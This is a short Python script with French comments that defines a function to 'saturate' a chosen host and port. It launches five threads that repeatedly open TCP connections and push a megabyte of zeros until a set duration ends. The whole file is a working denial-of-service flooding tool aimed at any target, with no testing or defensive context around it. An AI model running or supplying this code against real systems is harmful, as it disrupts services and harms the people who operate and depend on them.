import time
import socket # on importe la bibliothèque qui permet de créer des interfaces réseau virtuelles
import threading

def sat(duree, port, host):
    """Fonction pour saturer un port

    Args:
        duree (integer): Durée en secondes de l'exécution
        port (integer): port à saturer
        host (string): hôte à saturer
    """
    
    threads = 5 # Nombre de processus de saturation
    timer = time.time() + duree # Durée de la saturation

    def send_data():
        while time.time() < timer: # pour la durée de saturation
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # on crée un socket
                s.connect((host, port)) # on le connecte sur le port de l'hôte
                s.send(b'0' * 1024 * 1024) # on envoie les données
                s.close() # on ferme la connexion
            except Exception as e:
                print(f'Error:{e}')
    
    for i in range(threads):
        t = threading.Thread(target=send_data) # on crée un processus de saturation
        t.start() # lancement du processus
